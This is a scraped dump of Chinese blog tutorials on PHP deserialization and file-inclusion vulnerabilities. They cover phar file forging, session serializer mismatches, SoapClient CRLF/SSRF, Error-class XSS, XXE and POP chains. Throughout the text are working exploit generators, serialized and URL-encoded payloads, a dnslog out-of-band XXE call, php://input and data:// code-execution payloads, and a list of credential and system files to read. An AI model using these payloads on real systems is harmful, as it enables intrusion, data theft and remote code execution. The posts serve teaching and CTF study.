/ filemtime stat / fileinode / fileowner / filegroup / fileperms file / file_get_contents /file_put_contents readfile / fopen file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable parse_ini_file unlink copy  将phar文件进行伪造 php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。\n\u0026lt;?php class Test { } $phar = new Phar(\u0026#39;img.phar\u0026#39;); $phar -\u0026gt; startBuffering(); $phar -\u0026gt; setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); //设置stub，增加gif文件头  $phar -\u0026gt;addFromString(\u0026#39;test.txt\u0026#39;,\u0026#39;testHAHA\u0026#39;); //添加要压缩的文件  $object = new Test(); $object -\u0026gt; data = \u0026#39;haha\u0026#39;; $phar -\u0026gt; setMetadata($object); //将自定义meta-data存入manifest  $phar -\u0026gt; stopBuffering(); ?\u0026gt;\r\n修改后缀名可以继续反序列化，同时该文件在上传时一般可绕过上传检测。\nPhar反序列化漏洞利用 条件  phar文件要能够上传到服务器端 要有可用的魔术方法作为“跳板” 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤  示例 index.html:\n\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;title\u0026gt;upload file\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;form action=\u0026quot;upload.php\u0026quot; method=\u0026quot;post\u0026quot; enctype=\u0026quot;multipart/form-data\u0026quot;\u0026gt;\r\u0026lt;input type=\u0026quot;file\u0026quot; name=\u0026quot;file\u0026quot; /\u0026gt;\r\u0026lt;input type=\u0026quot;submit\u0026quot; name=\u0026quot;Upload\u0026quot; /\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\rupload.php:\n// 仅允许格式为gif的文件上传。上传成功的文件会存储到upload_file目录下。 \u0026lt;?php if (($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;]==\u0026#34;image/gif\u0026#34;)\u0026amp;\u0026amp;(substr($_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;], strrpos($_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;], \u0026#39;.\u0026#39;)+1))== \u0026#39;gif\u0026#39;) { echo \u0026#34;Upload: \u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]; echo \u0026#34;Type: \u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;]; echo \u0026#34;Temp file: \u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]; if (file_exists(\u0026#34;upload_file/\u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;])) { echo $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;] . \u0026#34; already exists. \u0026#34;; } else { move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;], \u0026#34;upload_file/\u0026#34; .$_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]); echo \u0026#34;Stored in: \u0026#34; . \u0026#34;upload_file/\u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]; } } else { echo \u0026#34;Invalid file,you can only upload gif\u0026#34;; } ?\u0026gt;evil.php:\n// file_exists函数会触发phar反序列化 \u0026lt;?php class Test{ var $data = \u0026#39;echo \u0026#34;Hello World\u0026#34;;\u0026#39;; function __destruct() { eval($this -\u0026gt; data); } } if ($_GET[\u0026#34;file\u0026#34;]){ file_exists($_GET[\u0026#34;file\u0026#34;]); } 利用：\n\u0026lt;?php class Test { } $phar = new Phar(\u0026#39;img.phar\u0026#39;); $phar -\u0026gt; startBuffering(); $phar -\u0026gt; setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); //设置stub，增加gif文件头  $phar -\u0026gt;addFromString(\u0026#39;test.txt\u0026#39;,\u0026#39;testHAHA\u0026#39;); //添加要压缩的文件  $object = new Test(); $object -\u0026gt; data = \u0026#34;system(\u0026#39;whoami\u0026#39;)\u0026#34;; $phar -\u0026gt; setMetadata($object); //将自定义meta-data存入manifest  $phar -\u0026gt; stopBuffering(); ?\u0026gt;\r\n","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/php-2/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/php-2/","title":"PHP 反序列化-2"},{"content":"PHP反序列化-3 PHP中的Session    Directive 含义     session.save_handler session保存形式。默认为files   session.save_path session保存路径。   session.serialize_handler session序列化存储所用处理器。默认为php   session.upload_progress.cleanup 一旦读取了所有POST数据，立即清除进度信息。默认开启   session.upload_progress.enabled 将上传文件的进度信息存在session中。默认开启。    在上述的配置中，session.serialize_handler是用来设置session的序列化引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不同。具体如下：\n   处理器名称 存储格式     php 键名 + 竖线 + 经过serialize()函数序列化处理的值   php_binary 键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值   php_serialize 经过serialize()函数序列化处理的数组    示例：\n\u0026lt;?php ini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;引擎名\u0026#39;); session_start(); $_SESSION[\u0026#39;name\u0026#39;] = \u0026#39;haha\u0026#39;; ?\u0026gt;php引擎：\r\nphp_binary:\r\nphp_serialize:\r\nSession反序列化漏洞原理 如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确反序列化。通过精心构造数据包，就可以绕过程序的验证或者是执行一些敏感操作。\n例如-在session中放入如下数据：\n$_SESSION['name'] = '|O:8:\u0026quot;stdClass\u0026quot;:0:{}';\r而存储session数据用的处理器为php_serialize，内容如下：\na:1:{s:4:\u0026quot;name\u0026quot;;s:20:\u0026quot;|O:8:\u0026quot;stdClass\u0026quot;:0:{}\u0026quot;;}\r那么当读取数据时采用的是php引擎的话，反序列化时，根据php引擎对session数据的解释，会将|以前看作键名，而将这之后的O:8:\u0026quot;stdClass\u0026quot;:0:{}看作键值，反序列后就会得到stdClass类对象。\n分两种情况进行利用：\n session.auto_start=On  当配置选项 session.auto_start＝On，会自动注册 Session 会话（相当于执行了session_start()），因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的。因此一些需要在脚本中设置序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话。然后设置需要的序列化处理器，再调用 session_start() 函数注册会话，这时如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题。\nif(ini_get(\u0026#39;session.auto_start\u0026#39;)) session_destroy(); ini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;php_serialize\u0026#39;); session_start(); if(isset($_GET[\u0026#39;test\u0026#39;])) $_SESSION[\u0026#39;test\u0026#39;] = $_GET[\u0026#39;test\u0026#39;];  session.auto_start=Off  两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题。\n示例 index.php:\n\u0026lt;?php //A webshell is wait for you ini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;php\u0026#39;); session_start(); class OowoO { public $mdzz; function __construct() { $this-\u0026gt;mdzz = \u0026#39;phpinfo();\u0026#39;; } function __destruct() { eval($this-\u0026gt;mdzz); } } if(isset($_GET[\u0026#39;phpinfo\u0026#39;])) { $m = new OowoO(); } else { highlight_string(file_get_contents(\u0026#39;index.php\u0026#39;)); } ?\u0026gt;传入phpinfo，看一看配置：\n\r\n可看到Session序列化和反序列化的处理引擎不同。\n而想要进行利用就得往session中放入数据，可利用session.upload_progress，可观察到session.upload_progress.cleanup配置为Off:\n当一个上传在处理中，同时 post 一个与 ini 设置的 session.upload_progress.name 同名变量时，php 检测到这种 post 请求时就会在 $SESSION 中添加一组数据，索引是 session.upload_progress.prefix 与 session.upload_progress.name 连接在一起的值，所以可通过 session.upload_progress 来设置 session。\n因此，利用如下：\n 构造exp  \u0026lt;?php class OowoO { public $mdzz; function __construct() { $this-\u0026gt;mdzz = \u0026#39;phpinfo();\u0026#39;; } function __destruct() { eval($this-\u0026gt;mdzz); } } $a = new OowoO(); $a-\u0026gt;mdzz = \u0026#34;system(\u0026#39;whoami\u0026#39;);\u0026#34;; echo serialize($a); ?\u0026gt; 构造上传表单  \u0026lt;form action=\u0026quot;index.php\u0026quot; method=\u0026quot;POST\u0026quot; enctype=\u0026quot;multipart/form-data\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;PHP_SESSION_UPLOAD_PROGRESS\u0026quot; value=\u0026quot;123\u0026quot; /\u0026gt; \u0026lt;input type=\u0026quot;file\u0026quot; name=\u0026quot;file\u0026quot; /\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; /\u0026gt;\r\u0026lt;/form\u0026gt;\r 拦截上传请求，修改PHP_SESSION_UPLOAD_PROGRESS的值为exp:  \r\n","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/php-3/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/php-3/","title":"PHP 反序列化-3"},{"content":"PHP反序列化-4 常用原生类的利用\n获取含魔术方法的内置类：\n\u0026lt;?php\r$classes = get_declared_classes(); // 返回由已定义类的名字所组成的数组\rforeach ($classes as $class) {\r$methods = get_class_methods($class); // 返回由类的方法名组成的数组\rforeach ($methods as $method) {\rif (in_array($method, array(\r'__destruct',\r'__toString',\r'__wakeup',\r'__call',\r'__callStatic',\r'__get',\r'__set',\r'__isset',\r'__unset',\r'__invoke',\r'__set_state'\r))) {\rprint $class . '::' . $method . \u0026quot;;\u0026quot;;\r}\r}\rprint \u0026quot;\\n\u0026quot;;\r}\rSoapClient + CLRF +SSRF 影响范围 php 5，7，8\n简介 SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。\n其采用HTTP作为底层通讯协议，XML作为数据传送的格式，仅限于http/https协议。\nSOAP消息基本上是从发送端到接收端的单向传输，但它们常常结合起来执行类似于请求 / 应答的模式。\n如果想要使用SoapClient类需要在php.ini配置文件里面开启相应的扩展。\n SoapClient::__construct ( string|null $wsdl , array $options = [] )  第一个参数为WSDL 文件的 URI ，如果是NULL 意味着不使用 WSDL 模式。\n第二个参数是一个数组，如果在WSDL 模式下，这个参数是可选的。如果在non-WSDL 模式下，必须设置location 和 uri 参数，location是要请求的 URL，uri是要访问的资源。\n SoapClient::__call ( string $name , array $args ) : mixed  该魔术方法可触发网络请求。\n原理 官方说明中表示，其所触发请求的user-agent头是可以由user_agent参数控制的，而且明显Content-Type 和 Content-Length 都在User-Agent 位置之下，所以我们可以通过user_agent参数构造我们自己的UA头去实现构造任意的POST请求。\n示例 \u0026lt;?php if($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]==\u0026#39;127.0.0.1\u0026#39;){ @$a=$_POST[1]; @eval($a); } ?\u0026gt;exp:\n\u0026lt;?php $target= \u0026#39;http://127.0.0.1/demo.php\u0026#39;; $post_string= \u0026#39;1=file_put_contents(\u0026#34;shell.php\u0026#34;, \u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\u0026#34;);\u0026#39;; $headers= array( \u0026#39;X-Forwarded-For:127.0.0.1\u0026#39;, \u0026#39;Cookie:admin=1\u0026#39; ); $b= new SoapClient(null,array(\u0026#39;location\u0026#39;=\u0026gt; $target,\u0026#39;user_agent\u0026#39;=\u0026gt;\u0026#39;wupco^^Content-Type:application/x-www-form-urlencoded^^\u0026#39;.join(\u0026#39;^^\u0026#39;,$headers).\u0026#39;^^Content-Length:\u0026#39;.(string)strlen($post_string).\u0026#39;^^^^\u0026#39;.$post_string,\u0026#39;uri\u0026#39;=\u0026gt;\u0026#34;haha\u0026#34;)); //因为User-agent是可以控制的，因此可以利用crlf注入http头部发送post请求 $aaa= serialize($b); $aaa= str_replace(\u0026#39;^^\u0026#39;,\u0026#39;%0d%0a\u0026#39;,$aaa); $aaa= str_replace(\u0026#39;\u0026amp;\u0026#39;,\u0026#39;%26\u0026#39;,$aaa); echo $aaa; $x= unserialize(urldecode($aaa));//调用__call方法触发网络请求发送 $x-\u0026gt;no_func(); ?\u0026gt;Error/Exception + XSS 影响范围 Error(php7, PHP8),\nException(php5, php7, PHP8)\n原理 Error类就是php的一个内置类用于自动自定义一个Error，在php环境下可能会造成xss漏洞，因为它内置有一个toString的方法。\n示例 \u0026lt;?php $a = unserialize($_GET[\u0026#39;a\u0026#39;]); echo $a; ?\u0026gt;Error exp：\n\u0026lt;?php $a = new Error(\u0026#34;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34;); echo urlencode(serialize($a)); ?\u0026gt;Error payload:\nO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A52%3A%22D%3A%5CDesktopFolder%5CCode%5CPhpCode%5CPhpStorm%5Ctest%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D\rException exp:\n\u0026lt;?php $a = new Exception(\u0026#34;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34;); echo urlencode(serialize($a)); ?\u0026gt;Exception payload:\nO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A52%3A%22D%3A%5CDesktopFolder%5CCode%5CPhpCode%5CPhpStorm%5Ctest%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D\rSimpleXMLElement + XXE 影响范围 php 5，7，8\n原理 实例化该类的对象传入xml代码进行xxe攻击，进而读取文件内容和命令执行。\n示例 exp：\n\u0026lt;?php\r$xml = \u0026lt;\u0026lt;\u0026lt;EOF\r\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;utf-8\u0026quot; ?\u0026gt;\r\u0026lt;!DOCTYPE ANY [\r\u0026lt;!ENTITY % remote SYSTEM \u0026quot;http://86vtbx.dnslog.cn\u0026quot;\u0026gt;%remote;]\u0026gt;\r]\u0026gt;\r\u0026lt;x\u0026gt;\u0026amp;xee\u0026lt;/x\u0026gt;\rEOF;\r$xml_class = new SimpleXMLElement($xml, LIBXML_NOENT);\rvar_dump($xml_class);\r?\u0026gt;\r\r\n","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/php-4/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/php-4/","title":"PHP 反序列化-4"},{"content":"反序列化漏洞还是非常有意思，值得学习，实践效果也非常不错，所以系统学习一下。\nPHP反序列化基础 类与对象 PPH中的类和对象\n\u0026lt;?php\rclass Person {\rpublic $name = \u0026quot;cool\u0026quot;;\rpublic function haha() {\recho $this-\u0026gt;name.\u0026quot;:hello!\\n\u0026quot;;\r}\r}\r$person1 = new Person();\r$person1-\u0026gt;haha();\r?\u0026gt;\r魔术方法 何为魔术方法？指的是:具备被应用自动调用的特性的一类方法(函数)，即触发了某事件前或后，魔术方法将自动调用执行，而一般函数必须手动调用。PHP将以\u0026quot;__\u0026ldquo;为开头的类方法保留为魔术方法。\n常见的魔术方法：\n   方法名称 作用     __get 原本类中的私有属性是无法直接访问的，PHP使用了该方法帮助获取私有属性，因此在调用私有属性或者该类不拥有的属性的时候会自动执行   __set 在设置不可访问属性的值时，即在调用私有属性的时候会自动执行   __toString 当对象被当做一个字符串使用时调用(返回一个该类被当作字符串使用时所能替代的字符串)   __sleep 序列化对象之前调用(返回一个包含应被序列化的属性的数组)   __wakeup 反序列化对象之前调用   __call 该方法在调用的方法不存在时会自动调用，程序仍会继续执行下去   __isset 当对不可访问属性调用 isset()或empty()时会被调用   __unset 当对不可访问属性调用unset()时会被调用   __invoke 当脚本尝试将对象调用为函数时触发   __callStatic() 在静态上下文中调用不可访问的方法时触发    魔术方法举例：\n\u0026lt;?php\rclass Person {\rprivate $name = \u0026quot;cool\u0026quot;;\rpublic function haha() {\recho \u0026quot;\\n\u0026quot;.$this-\u0026gt;name.\u0026quot;:hello!\\n\u0026quot;;\t}\rpublic function __wakeup() {\recho \u0026quot;\\n __wakeup method!\\n\u0026quot;;\r}\rpublic function __construct() {\recho \u0026quot;\\n __construct method!\\n\u0026quot;;\r}\rpublic function __destruct() {\recho \u0026quot;\\n __destruct method!\\n\u0026quot;;\r}\rpublic function __set($key, $value) {\recho \u0026quot;\\n __set method!\\n\u0026quot;;\r}\rpublic function __get($key) {\recho \u0026quot;\\n __get method!\\n\u0026quot;;\r}\rpublic function __toString() {\recho \u0026quot;\\n __toString method!\\n\u0026quot;;\r}\r}\r$person1 = new Person();\r$person1-\u0026gt;name = \u0026quot;new cool\u0026quot;;\recho $person1-\u0026gt;name;\r$ser_person1 = serialize($person1);\r$unser_person1 = unserialize($ser_person1);\rprint_r($unser_person1);\r?\u0026gt;\r\r\n注：\n print_r接受对象类型，所以未调用__toString，如果使用print或echo函数，则会发生调用；\n反序列化后产生两个对象，随后两个对象都消亡，调用两次__destruct；\n 序列化定义 序列化指将对象或数据结构转换为可存储形式(字符串)的过程。目的是为了更方便存储和传输数据结构或对象。\nPHP序列化方法：\nserialize()、json_encode()\n序列化例子：\n\u0026lt;?php\rclass Person {\rpublic $name = \u0026quot;cool\u0026quot;;\rprivate $age = \u0026quot;18\u0026quot;;\rprotected $sex = \u0026quot;boy\u0026quot;;\rpublic function say() {\recho $this-\u0026gt;name.\u0026quot;:hello!\\n\u0026quot;;\r}\r}\r$person1 = new Person();\r$ser_person1 = serialize($person1);\rprint($ser_person1);\r?\u0026gt;\r\r\n含义解释：\n类：类名长度：\u0026ldquo;对应类型\u0026rdquo;：类的属性数量：{类型：属性名长度：\u0026ldquo;属性名\u0026rdquo;；类型：属性值长度：\u0026ldquo;属性值\u0026rdquo;；\u0026hellip;\u0026hellip;}\n注：\n 发现private属性和protected属性在序列化时，属性名和属性长度与public属性不同\n private属性在序列化时，属性名变为：\\x00 + 属性所在类名 + \\x00 + 属性名；属性名长度相应改变 protected属性在序列化时，属性名变为：\\x00 + * + \\x00 + 属性名   反序列化定义 将序列化后的字符串转换为原有数据结构或对象的过程。\nPHP反序列化方法：\nunserialize()、json_decode()\n举例：\n// 将之前例子序列化后的字符串还原为对象\r\u0026lt;?php\rclass Person {\rpublic $name = \u0026quot;cool\u0026quot;;\rprivate $age = \u0026quot;18\u0026quot;;\rprotected $sex = \u0026quot;boy\u0026quot;;\rpublic function say() {\recho $this-\u0026gt;name.\u0026quot;:hello!\\n\u0026quot;;\r}\r}\r$ser = 'O:6:\u0026quot;Person\u0026quot;:3:{s:4:\u0026quot;name\u0026quot;;s:4:\u0026quot;cool\u0026quot;;s:3:\u0026quot;age\u0026quot;;s:2:\u0026quot;18\u0026quot;;s:3:\u0026quot;sex\u0026quot;;s:3:\u0026quot;boy\u0026quot;;}';\r$unser = unserialize($ser);\rvar_dump($unser);\r?\u0026gt;\r\r\n反序列化漏洞 反序列化漏洞就在于攻击者控制外部输入，实际攻击者可控的只是任意类对象的属性而不是方法，所以必须选择控制那些存在魔术方法(自动调用)，且方法中含有可以利用函数的类。最终实现从操控对象属性到操控敏感函数的目的。\n示例 \u0026lt;?php class A { private $test; function __construct() { $this-\u0026gt;test = new B(); } function __destruct() { $this-\u0026gt;test-\u0026gt;say(); } } class B { function say() { echo \u0026#34;haha!\u0026#34;; } } class Evil { var $test1; function say() { eval($this-\u0026gt;test1); } } unserialize($_GET[\u0026#39;test\u0026#39;]); \u0026gt;?  分析  首先可以明确unserialize函数的参数是外部获取，即我们可以控制反序列化任何类对象。分析当前的三个类，在B类和Evil类中，我们无法调用其中的方法，没有什么意义，但可以明确Evil类方法中存在eval危险函数。\n观察A类，其存在__construct构造函数和__destruct析构函数，在构造函数中修改test属性为B类的对象，析构函数中调用了其test属性的say()方法，而Evil类中的say()方法却调用了执行命令的函数。\n因此思路比较明确：只要我们反序列化时，修改A类的test属性为Evil类对象，则在A类对象销毁时会调用Evil类中的say()，从而实现反序列化执行任意命令。\n payload  \u0026lt;?php class A { private $test; function __construct() { $this-\u0026gt;test = new Evil(); } } class Evil { var $test1 = \u0026#34;system(\u0026#39;whoami\u0026#39;);\u0026#34; } $A = new A(); $payload = serialize($A); var_dump($payload); ?\u0026gt;序列化生成payload：\n\r\n 注意不要丢掉private属性的属性名中的%00\nO:1:\u0026quot;A\u0026quot;:1:{s:7:\u0026quot;%00A%00test\u0026quot;;O:4:\u0026quot;Evil\u0026quot;:1:{s:5:\u0026quot;test1\u0026quot;;s:17:\u0026quot;system('whoami');\u0026quot;;}}\r \r\nPHP反序列化POP链 POP链 POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击效果。\n实际上ROP 是通过栈溢出实现控制指令的执行流程；而反序列化就是通过控制对象的属性从而实现控制程序的执行流程。\n示例 \u0026lt;?php //flag is in flag.php error_reporting(1); class Read { public $var; public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } public function __invoke(){ $content = $this-\u0026gt;file_get($this-\u0026gt;var); echo $content; } } class Show { public $source; public $str; public function __construct($file=\u0026#39;index.php\u0026#39;) { $this-\u0026gt;source = $file; echo $this-\u0026gt;source.\u0026#39;Welcome\u0026#39;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } public function __toString() { return $this-\u0026gt;str[\u0026#39;str\u0026#39;]-\u0026gt;source; } public function _show() { if(preg_match(\u0026#39;/gopher|http|ftp|https|dict|\\.\\.|flag|file/i\u0026#39;,$this-\u0026gt;source)) { die(\u0026#39;hacker\u0026#39;); } else { highlight_file($this-\u0026gt;source); } } public function __wakeup() { if(preg_match(\u0026#34;/gopher|http|file|ftp|https|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { echo \u0026#34;hacker\u0026#34;; $this-\u0026gt;source = \u0026#34;index.php\u0026#34;; } } } class Test { public $p; public function __construct() { $this-\u0026gt;p = array(); } public function __get($key) { $function = $this-\u0026gt;p; return $function(); } } if(isset($_GET[\u0026#39;hello\u0026#39;])) { unserialize($_GET[\u0026#39;hello\u0026#39;]); } else { $show = new Show(\u0026#39;pop3.php\u0026#39;); $show-\u0026gt;_show(); } ?\u0026gt;分析并寻找POP链：\n 先找外部可控的反序列化入口：unserialize($_GET['hello']); 分析各类的魔术方法 Show类中存在__wakeup()方法，其中对source属性调用preg_match()方法，如果source是某个类对象，会触发__toString()方法 Show类__toString()方法从str属性中取str键，如果果str['str']是某一个类对象，会触发__get()方法 Test类中存在__get()方法，其中尝试对p属性进行函数调用，如果p属性是某个类对象，会触发__invode()方法 Read类中存在__invoke()方法，其中调用方法去读取var属性值的文件内容。因此，为了获取flag.php，可让var=flag.php  基于以上分析，编写脚本生成payload：\n\u0026lt;?php class Read { public $var = \u0026#39;/etc/passwd\u0026#39;; } class Show { public $source; public $str; } class Test { public $p; } $R = new Read(); $S = new Show(); $T = new Test(); $T-\u0026gt;p = $R; $S-\u0026gt;str[\u0026#39;str\u0026#39;] = $T; $S-\u0026gt;source = $S; var_dump(serialize($S)); \r\n","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/php-1/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/php-1/","title":"PHP 反序列化基础"},{"content":"PHP文件包含漏洞相关 类别  本地文件包含  如若关闭allow_url_fopen，一般只能包含本地文件\n 远程文件包含  需要开启allow_url_fopen 和 allow_url_include\n 注意：\nphp.ini中，allow_url_fopen默认开启，而allow_url_include从php5.2之后默认关闭\n 包含的相关函数 引发文件包含漏洞的相关函数如下:\n include() include_once() require() require_once()   require()在包含过程中出错(比如文件不存在)，会直接退出，不执行后续语句\ninclude()出错，会执行后续语句\nrequire_once()和include_once()，如果某文件已经被包含，则不会再包含该文件，避免重定义或变量赋值等问题\n 以上四个函数，不论文件类型如何(比如图片、.txt)，都会直接被当作php文件进行解析。\n利用 \r\n本地敏感文件包含 常见敏感文件列表：\nWindows：\rC:\\boot.ini //查看系统版本\rC:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件\rC:\\Windows\\repair\\sam //存储系统初次安装的密码\rC:\\Program Files\\mysql\\my.ini //Mysql配置\rC:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root\rC:\\Windows\\php.ini //php配置信息\rC:\\Windows\\my.ini //Mysql配置信息\r...\rLinux：\r/root/.ssh/authorized_keys\r/root/.ssh/id_rsa\r/root/.ssh/id_ras.keystore\r/root/.ssh/known_hosts\r/etc/passwd\r/etc/shadow\r/etc/my.cnf\r/etc/httpd/conf/httpd.conf\r/root/.bash_history\r/root/.mysql_history\r/proc/self/fd/fd[0-9]*(文件标识符)\r/proc/mounts\r/porc/config.gz\r远程文件包含 payload：\n[http|https|ftp]://www.test.com/shell.txt\r若后缀名写死，可以用 ? 绕过:\n//www.test.com/shell.txt?a\r 如果是包含远程服务器上的PHP文件，那么得到的是被远程服务器解析过的PHP，所以在写一句话木马的时候就不要做成.php的文件，一般包含.txt的文件\n 伪协议 file:// 一般用来读本地文件：\nfile://文件的绝对路径\rphp://协议  php://input  php://input协议主要用于访问各个输入/输出流。\n php://input可读取未经处理过的POST数据\n当enctype=\u0026quot;multipart/form-data\u0026quot;的时候，php://input是无效的\n 遇到file_get_contents，也可使用php://input获取POST内容。\n利用条件：\nallow_url_fopen 无要求\rallow_url_include = On\rpayload：\n?file=php://input\rPOST:\r\u0026lt;?php phpinfo ?\u0026gt;\r php://filter   php://filter是一种元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。对于一体式(all-in-one)的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()。\n 常见参数：\nstring.toupper //上面有写\rstring.tolower //转换为小写\rstring.strip_tags //去除html和php标记，比如\u0026lt;?php?\u0026gt;\rconvert.base64-encode //base64编码\rconvert.base64-decode //base64编码\rconvert.quoted-printable-encode //quoted-printable 转 8bit\rconvert.quoted-printable-decode //同上\r利用条件：\n默认\npayload：\n?file=php://filter/convert.base64-encode/resource=include.php\r解码后读取源码即可。\ndata://协议 利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中。\n利用条件：\nphp版本\u0026gt;=5.2\rallow_url_fopen = On\rallow_url_include = On\rpayload：\n?file=data://text/plain,\u0026lt;?php phpinfo()?\u0026gt;\r?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\r?file=data:text/plain,\u0026lt;?php phpinfo()?\u0026gt;\r?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\rphar://协议 当文件上传被过滤，可结合文件包含利用。\n利用条件：\nphp版本\u0026gt;=5.3.0\rpayload-将一句话-shell.php压缩为shell.zip，修改后缀为上传点允许值，例如.png，上传至网站：\n//指定绝对路径\r?file = phar:///var/www/html/test.png/phpinfo.txt\r//指定相对路径\r?file = phar://./test.png/phpinfo.txt\rzip://, bzip2://, zlib://协议 这三个协议均属于压缩流，可访问压缩包中的子文件。后缀名无所谓，只要是zip文件头即可。\n利用条件：\nphp版本\u0026gt;5.3.0\rpayload：\nzip:///var/www/html/phpinfo1.php#phpinfo.php\r 注意#要url编码\n 伪协议总结 \r\n日志文件 Web请求一般会被记录再日志文件中，例如apache的access log和error log，该两个文件路径默认在/var/log/apache2/下。\n因此可以构造带有一句话木马内容的请求，会被记录日志中，再包含日志即可。\n 注意：\n一般WWW用户是无权限读取该日志的，应用场景有限。\n Session文件 PHP中 upload_process 和 session相关配置介绍 session.upload_progress.enabled = on\rsession.upload_progress.cleanup = on\rsession.upload_progress.prefix = \u0026quot;upload_progress_\u0026quot;\rsession.upload_progress.name = \u0026quot;PHP_SESSION_UPLOAD_PROGRESS\u0026quot;\rsession.use_strict_mode\r enabled=on表示当浏览器向服务器上传文件的时候，PHP会把本次文件上传的详细信息存储在session中 cleanup=on表示上传结束后，PHP会立即清空对应的session文件中的内容 PHP文档中对prefix和name两个选项详细说明：  \r\n session.use_strict_mode=0，表明用户可以自定义Session 